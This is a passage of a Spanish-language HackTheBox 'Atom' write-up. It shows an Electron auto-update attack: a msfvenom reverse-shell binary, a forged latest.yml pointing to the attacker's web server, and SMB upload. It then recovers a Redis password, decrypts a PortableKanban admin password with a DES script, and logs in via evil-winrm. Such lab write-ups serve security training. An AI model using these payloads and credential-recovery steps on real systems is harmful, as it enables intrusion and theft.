+<p>Lo unico que nos quedaria hacer seria, subir el binario <code>try'now.exe</code> y el objeto <code>latest.yml</code> a alguna de las carpetas <code>client</code> y ver si pasa algo (: <strong><em>Spoiler: No pasa nada :P</em></strong></p>
+
+<p>Pero antes, nos ponemos en escucha con ayuda de <strong>netcat</strong> por el puerto que indicamos en el binario malicioso:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+listening on [any] 4433 ...
+</code></pre>
+
+<p>Ahora si:</p>
+
+<pre><code class="language-bash">❱ smbclient //10.10.10.237/Software_Updates -U 'null'
+Enter WORKGROUP\null's password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; cd client2
+</code></pre>
+
+<pre><code class="language-bash">smb: \client2\&gt; put try'now.exe 
+putting file try'now.exe as \client2\try'now.exe (43,3 kb/s) (average 43,3 kb/s)
+smb: \client2\&gt; put latest.yml 
+putting file latest.yml as \client2\latest.yml (0,4 kb/s) (average 34,5 kb/s)
+</code></pre>
+
+<p>Entiendo que generaría el error y en la misma ruta en la que esta el objeto <code>latest.yml</code> buscara el binario <code>try'now.exe</code> y lo ejecutara…</p>
+
+<p>Pues nada, probé y probé cosas, cambie la ruta, me invente otras, jugué para en tal caso diera error ejecutara despues <code>certutil.exe ...</code>, pero tampoco, bueno, varias cositas hice, hasta que por fin probé algo que funciono…</p>
+
+<p>…</p>
+
+<h3 id="expl-yml-bin-hash">(EL GOOD) <u>latest.yml</u>, bin malicioso y hash <a href="#expl-yml-bin-hash">⌖</a></h3>
+
+<p>Tomando nuestro archivo <code>latest.yml</code> me fui pa la web a buscar ejemplos de él, llegamos a este:</p>
+
+<ul>
+  <li><a href="https://www.electron.build/auto-update#staged-rollouts">Auto Update - Staged Rollouts, Electron Build Docs</a>.</li>
+</ul>
+
+<p>En él tenemos esta estructura:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340google_electron_docs_latestYML.png" alt="340google_electron_docs_latestYML" /></p>
+
+<p>Así que la tome y empece a jugar con ella, quitando así el apartado <strong>files</strong> que había antes (y como <strong>stagingPercentage</strong> no estaba en el artículo inicial, también lo quite):</p>
+
+<pre><code class="language-yml">version: 1.2.3
+path: try\'now.exe
+sha512: 0Wxg/xq3XPmrHevFPBwR4aSmnc8b+5gaKB9HuEAZcBXghS2MaDblK3lRPOpCEMiqe5wFI2ZxMQ7Jc7M2JSTF8Q==
+</code></pre>
+
+<p>Pero nadita de nadita…</p>
+
+<p>En un momento se me dio por probar colocar una ruta hacia algún servidor web en <strong>path</strong>, ahí me cambio la cara:</p>
+
+<p>Levantamos el servidor web:</p>
+
+<pre><code class="language-bash">❱ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<p>Y ahora nuestro archivo <code>latest.yml</code> quedaría así:</p>
+
+<pre><code class="language-yml">version: 1.2.3
+path: http://10.10.14.103:8000/try'now.exe
+sha512: 0Wxg/xq3XPmrHevFPBwR4aSmnc8b+5gaKB9HuEAZcBXghS2MaDblK3lRPOpCEMiqe5wFI2ZxMQ7Jc7M2JSTF8Q==
+</code></pre>
+
+<p>Lo subimos al servidor <strong>SMB</strong>:</p>
+
+<pre><code class="language-bash">smb: \client2\&gt; put latest.yml
+</code></pre>
+
+<p>Y en nuestro servidor web recibimos:</p>
+
+<pre><code class="language-bash">❱ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.237 - - [23/Jun/2021 25:25:25] code 404, message File not found
+10.10.10.237 - - [23/Jun/2021 25:25:25] "GET /try'now.exe.blockmap HTTP/1.1" 404 -
+10.10.10.237 - - [23/Jun/2021 25:25:25] "GET /try%27now.exe HTTP/1.1" 200 -
+</code></pre>
+
+<p>Opa opa opaaaa, vaya cosa extrañaaaa, peeero tenemos respuesta (:</p>
+
+<p>Yyyy en nuestro listener que teníamos de antes recibimooooooooooooooooooooooooooos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_jasonRevSH.png" alt="340bash_jasonRevSH" /></p>
+
+<p>:O</p>
+
+<p>Pero siento que quedo desorganizado, así que haremos una vez más el proceso mucho más directo:</p>
+
+<h3 id="expl-revsh-jason">Obtenemos Reverse Shell como <u>jason</u> <a href="#expl-revsh-jason">⌖</a></h3>
+
+<p>Generamos <strong>binario <code>.exe</code> malicioso</strong>:</p>
+
+<pre><code class="language-bash">❱ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.103 LPORT=4433 -f exe -o try\'now.exe
+</code></pre>
+
+<p>Le volvemos a generar un hash, ya que si cambia el contenido del programa, cambia el hash:</p>
+
+<blockquote>
+  <p>Si el programa es el mismo no hace falta volver a generarlo, ya que toma el hash, lo busca en las “updates” y ejecuta lo que este relacionado a él, o sea, no necesitariamos el servidor web.</p>
+</blockquote>
+
+<pre><code class="language-bash">❱ shasum -a 512 "try'now.exe" | cut -d " " -f1 | xxd -r -p | base64 | tr -d '\n'
+AOztWPlDvzM4pyop/YcVeKbFXQzDOSRrtOb0NUGfxeDPaDTfRJtu/qDYmXjh76gMbsZx4coGmgCvxUQ1J48dXQ==
+</code></pre>
+
+<p>Ahora actualizamos el archivo <code>latest.yml</code>:</p>
+
+<pre><code class="language-yml">version: 1.2.3
+path: http://10.10.14.103:8000/try'now.exe
+sha512: AOztWPlDvzM4pyop/YcVeKbFXQzDOSRrtOb0NUGfxeDPaDTfRJtu/qDYmXjh76gMbsZx4coGmgCvxUQ1J48dXQ==
+</code></pre>
+
+<p>Nos ponemos en escucha, tanto por el servidor web como por <strong>netcat</strong> (puerto <strong>4433</strong>).</p>
+
+<p>Subimos el objeto <code>latest.yml</code> a alguna carpeta compartida:</p>
+
+<pre><code class="language-bash">smb: \client2\&gt; put latest.yml 
+</code></pre>
+
+<p>Yyyyy en nuestro listener tendríamos la <strong>Reverse Shell</strong> (:</p>
+
+<blockquote>
+  <p>La idea que teniamos de modificar el binario con cositas maliciosas cayo en picada :( no era tan por ahí, pero igual no estabamos TAAAAN erroneos e.e</p>
+</blockquote>
+
+<p>…</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/atom/electroPWn.py">Script que nos automatiza todo el proceso y genera Shell, <strong>electroPWn.py</strong></a>.</p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_electroPWn_py.png" alt="340bash_electroPWn_py" /></p>
+
+<p><strong><em>(Ten en cuenta que más o menos cada 30 segundos ejecuta lo que hay en las carpetas cliente, entonces puede ser random que te lance la</em></strong> Reverse Shell <strong><em>en el tiempo que esta escuchando el programa (igual puedes jugar con esos tiempos), pero de 10 intentos, 7 me la devolvió en una sola ejecución.)</em></strong> Pero repito, <strong>es bastante random</strong> :(</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Enumerando el sistema (y recordando nuestro escaneo de <strong>nmap</strong>) encontramos cositas relacionadas con el servicio <a href="https://blog.bi-geek.com/redis-para-principiantes/">Redis</a> en la ruta <code>C:\Program Files\Redis</code>:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Redis&gt; dir
+
+    Directory: C:\Program Files\Redis
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          4/2/2021   7:31 AM                Logs
+-a----          7/1/2016   3:54 PM           1024 EventLog.dll
+-a----          7/1/2016   3:52 PM          12618 Redis on Windows Release Notes.docx
+-a----          7/1/2016   3:52 PM          16769 Redis on Windows.docx
+-a----          7/1/2016   3:55 PM         406016 redis-benchmark.exe
+-a----          7/1/2016   3:55 PM        4370432 redis-benchmark.pdb
+-a----          7/1/2016   3:55 PM         257024 redis-check-aof.exe
+-a----          7/1/2016   3:55 PM        3518464 redis-check-aof.pdb
+-a----          7/1/2016   3:55 PM         268288 redis-check-dump.exe
+-a----          7/1/2016   3:55 PM        3485696 redis-check-dump.pdb
+-a----          7/1/2016   3:55 PM         482304 redis-cli.exe
+-a----          7/1/2016   3:55 PM        4517888 redis-cli.pdb
+-a----          7/1/2016   3:55 PM        1553408 redis-server.exe
+-a----          7/1/2016   3:55 PM        6909952 redis-server.pdb
+-a----          4/2/2021   7:39 AM          43962 redis.windows-service.conf
+-a----          4/2/2021   7:37 AM          43960 redis.windows.conf
+-a----          7/1/2016   9:17 AM          14265 Windows Service Documentation.docx
+</code></pre>
+
+<p>Vemos dos archivos de configuración:</p>
+
+<pre><code class="language-powershell">...
+-a----          4/2/2021   7:39 AM          43962 redis.windows-service.conf
+-a----          4/2/2021   7:37 AM          43960 redis.windows.conf
+...
+</code></pre>
+
+<p>Inicialmente no encontré nada en ellos, seguí y seguí, me perdí y despues caí en esta guía:</p>
+
+<ul>
+  <li><a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">6379 - Pentesting <strong>Redis</strong></a>.</li>
+</ul>
+
+<p>En ella se habla de una autenticación necesaria para jugar con <strong>redis</strong> y que en algunos casos es posible encontrarse contraseñas en archivos <code>.conf</code> dentro del parámetro <code>requirepass</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340google_redis_hacktricks_requirepass.png" alt="340google_redis_hacktricks_requirepass" /></p>
+
+<h3 id="privesc-redis">Acceso servidor <u>Redis</u> - archivo <u>.conf</u> <a href="#privesc-redis">⌖</a></h3>
+
+<p>Probando a buscar esa cadena (el parámetro) en los archivos de configuración encontramos algo:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\Redis&gt; type redis.windows-service.conf | Select-String -Pattern 'requirepass' 
+
+requirepass kidvscat_yes_kidvscat
+# If the master is password protected (using the "requirepass" configuration
+# requirepass foobared
+</code></pre>
+
+<p>Vemos 3 resultados, pero solo uno sin comentarios (<code>#</code>), tomemos esa cadena y juguemos ahora con la utilidad <a href="https://redis.io/topics/rediscli">redis-cli</a>, con ella podemos movernos entre servidores de DB <strong>redis</strong>, usando el parámetro <code>auth</code> dentro de la consola de <strong>redis</strong> le concatenamos la cadena encontrada (que sería la pw):</p>
+
+<pre><code class="language-bash">❱ redis-cli -h 10.10.10.237
+10.10.10.237:6379&gt; auth hola123
+(error) ERR invalid password
+10.10.10.237:6379&gt; auth kidvscat_yes_kidvscat
+OK
+</code></pre>
+
+<p>Perfecto, tamos dentro del servidor <strong>redis</strong>, apoyándonos de la misma <a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#dumping-database">guía</a> podemos dumpear las bases de datos existentes:</p>
+
+<h3 id="privesc-dump-redis">Dumpeamos la base de datos <u>Redis</u> <a href="#privesc-dump-redis">⌖</a></h3>
+
+<p>Primero vemos cuantas DB hay:</p>
+
+<pre><code class="language-bash">10.10.10.237:6379&gt; info
+...
+...
+# Keyspace
+db0:keys=4,expires=0,avg_ttl=0
+</code></pre>
+
+<p>Solo una base de datos con indice <code>0</code>, juguemos con ella:</p>
+
+<pre><code class="language-bash">10.10.10.237:6379&gt; SELECT 0
+OK
+</code></pre>
+
+<pre><code class="language-bash">10.10.10.237:6379&gt; KEYS *
+1) "pk:ids:MetaDataClass"
+2) "pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"
+3) "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
+4) "pk:ids:User"
+</code></pre>
+
+<p>4 llaves, para dumpear sus valores debemos usar <code>GET &lt;key&gt;</code>, al jugar con la <strong>3</strong> encontramos esto:</p>
+
+<pre><code class="language-bash">10.10.10.237:6379&gt; GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
+</code></pre>
+
+<pre><code class="language-json">"{
+  "Id":"e8e29158d70d44b1a1ba4949d52790a0",
+  "Name":"Administrator",
+  "Initials":"",
+  "Email":"",
+  "EncryptedPassword":"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi",
+  "Role":"Admin",
+  "Inactive":false,
+  "TimeStamp":637530169606440253
+}"
+</code></pre>
+
+<p>Bien, información de un usuario llamado <strong>Administrator</strong> y entre ella una contraseña encriptada (:</p>
+
+<p>Buscando maneras de desencriptarla no llegamos a ningún resultado, acá me reperdi un buen rato, así que decidí buscar ayuda…</p>
+
+<p>Me indicaron que enumerara el directorio de <strong>jason</strong> (<code>c:\Users\jason</code>) (cosa que ya había hecho, peeeeero sobre vi algunas cosas)…</p>
+
+<p>En el directorio <code>c:\Users\jason\Downloads</code> vemos una carpeta llamada <code>PortableKanban</code> y en ella varios objetos de <strong>kanban</strong>, uno de ellos es la guía para el usuario:</p>
+
+<pre><code class="language-powershell">PS C:\Users\jason\Downloads\PortableKanban&gt; dir
+
+    Directory: C:\Users\jason\Downloads\PortableKanban
+
+Mode                 LastWriteTime         Length Name
+...
+-a----          1/4/2018   8:14 PM        1050092 User Guide.pd
+</code></pre>
+
+<p>Copiándonoslo a nuestra máquina, abriéndolo con <code>xdg-open</code> y leyéndolo caemos en cuenta de algo…</p>
+
+<p><em>*(Podemos copiarlo fácilmente compartiéndonos una carpeta con *SMB</em> (o incluso colocándolo en la carpeta compartida que ya existe en la máquina)).</p>
+
+<p>Levantamos carpeta llamada <code>smbFolder</code>:</p>
+
+<pre><code class="language-bash">❱ smbserver.py smbFolder $(pwd) -smb2support
+</code></pre>
+
+<p>Y desde <strong>Windows</strong> indicamos:</p>
+
+<pre><code class="language-powershell">PS C:\Users\jason\Downloads\PortableKanban&gt; copy "User Guide.pdf" \\10.10.14.103\smbFolder\"User Guide.pdf"
+</code></pre>
+
+<p>Ya lo tendríamos:</p>
+
+<pre><code class="language-bash">❱ file User\ Guide.pdf 
+User Guide.pdf: PDF document, version 1.7
+</code></pre>
+
+<p>Lo abrimos y:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_pdf_kanban1.png" alt="340bash_pdf_kanban1" /></p>
+
+<p>Así que todo lo que pase por <strong>kanban</strong> debe ser manejado desde <strong>redis</strong>…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_pdf_kanban2.png" alt="340bash_pdf_kanban2" /></p>
+
+<p>Y (lo que ya sabíamos) que existe un archivo con todas las configuraciones del servidor <strong>redis</strong> llamado <code>redis.windows-service.conf</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_pdf_kanban3.png" alt="340bash_pdf_kanban3" /></p>
+
+<p>Y vemos la estructura de la tabla de la cual encontramos valores anteriormente (los de <strong>administrator</strong>)…</p>
+
+<h3 id="privesc-encrypted-revealed">Desencriptamos la contraseña de <u>Administrator</u> <a href="#privesc-encrypted-revealed">⌖</a></h3>
+
+<p>Esto último me recordó una máquina de <strong>HTB</strong> (<strong><em>pequeño spoiler</em></strong>, si no lo quieres, cierra los ojos, pero que puedas leer lo mínimo, busca esto en unas 4, 5 líneas abajo: <code>Es practicamente lo mismo ...</code>, sigue desde ahí 😜) la máquina <strong>Sharp</strong>, en ella habíamos usado también <strong>PortableKanban</strong> y debíamos (también &lt;redundancia :P&gt;) desencriptar unas contraseñas que estaban almacenadas en un archivo <code>.pk3</code>. Esto lo logramos gracias a un <a href="https://www.exploit-db.com/exploits/49409">exploit</a> que tomaba ese archivo y con ayuda de una clave <strong>DES</strong> conseguía la contraseña en texto plano.</p>
+
+<p><code>Es prácticamente lo mismo</code>, solo que en nuestro caso no tenemos ese tipo de archivos, simplemente la password. Juguemos con el script y hagámosle unas modificaciones:</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/49409">PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval</a>.</li>
+</ul>
+
+<p>Y a nosotros nos quedaria así:</p>
+
+<pre><code class="language-py">import base64
+from des import *
+
+def decode(hash):
+    hash = base64.b64decode(hash.encode('utf-8'))
+    key = DesKey(b"7ly6UznJ")
+    return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')
+
+print("Contraseña: " + decode("Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi"))
+</code></pre>
+
+<p>En su ejecución logramos el cometido, vemos la contraseña en texto plano:</p>
+
+<pre><code class="language-bash">❱ python3 kanban_decrypt.py 
+Contraseña: kidvscat_admin_@123
+</code></pre>
+
+<p>Listos…</p>
+
+<p>Recordando que tenemos el puerto <strong>5985</strong> (WinRM) activo, podemos aprovechar el uso de <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> para obtener una <strong>PowerShell</strong> en el sistema (siempre y cuando las credenciales sean válidas, no nos emocionemos e.e):</p>
+
+<pre><code class="language-bash">❱ evil-winrm -i 10.10.10.237 -u 'Administrator' -p 'kidvscat_admin_@123'
+</code></pre>
+
+<p>Ejecutamos yyyyyyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_evilwinrm_adminSH.png" alt="340bash_evilwinrm_adminSH" /></p>
+
+<p>Estamos inside de la máquina como el usuario <strong>Administrator</strong> (:</p>
+
+<p>Tomemos las flags…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340flags.png" alt="340flags" /></p>
+
+<p>…</p>
+
+<p>No sé por qué la máquina esta rateada tan bajito (actualmente tiene <code>2.8</code>) sino esta mal, quizás puede ser por problemas que tuvo al inicio, porque temas de lentitud o fallos gratis no me cayeron.</p>
+
+<p>El inicio me pareció super interesante (además que es algo real, algo que pasa), lo de <strong>redis</strong> y <strong>kanban</strong> también fue relevante, pero me llamo más la atención lo de <code>electron</code> (aunque tira también mucho a la realidad). En general la máquina esta bien y esta pensada para ser <strong>Real Life</strong>.</p>
+
+<p>Y bueno, emoakabao. No siendo más, yo me voy retirando, ahí quedo todo organizado, la comida hecha y la ropa doblada, nos vemos yyyy <strong>a seguir rompiendo todo!!</strong></p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Atom&url=http://localhost:4000/htb/atom" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SMB">SMB</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#electron">electron</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#kanban">kanban</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#redis">redis</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/heist">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201banner.png" alt="HackTheBox - Heist"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/heist">HackTheBox - Heist</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel fácil, jugaremos con crackeo de passwords Cisco, movimientos laterales para encontrar usuarios a los cuales no teníamos acceso yyyyyy dumpearemos procesos de Firefox para ver que está...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">15 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/bastion">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186banner.png" alt="HackTheBox - Bastion"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/bastion">HackTheBox - Bastion</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel fácil. Nos moveremos con Samba, jugaremos con el backup de una máquina virtual Windows para extraer los archivos SAM y SYSTEM… Crackearemos cosillas y nos daremos cuenta...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">08 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/active">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148banner.png" alt="HackTheBox - Active"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/active">HackTheBox - Active</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio, de cabeza contra un Domain Controller, jugaremos mucho con SMB y sus carpetas compartidas, movimientos SYStematicos y VOLtaicos e.e, bastante crackeo de contraseñas y obtención de...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">16 May 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
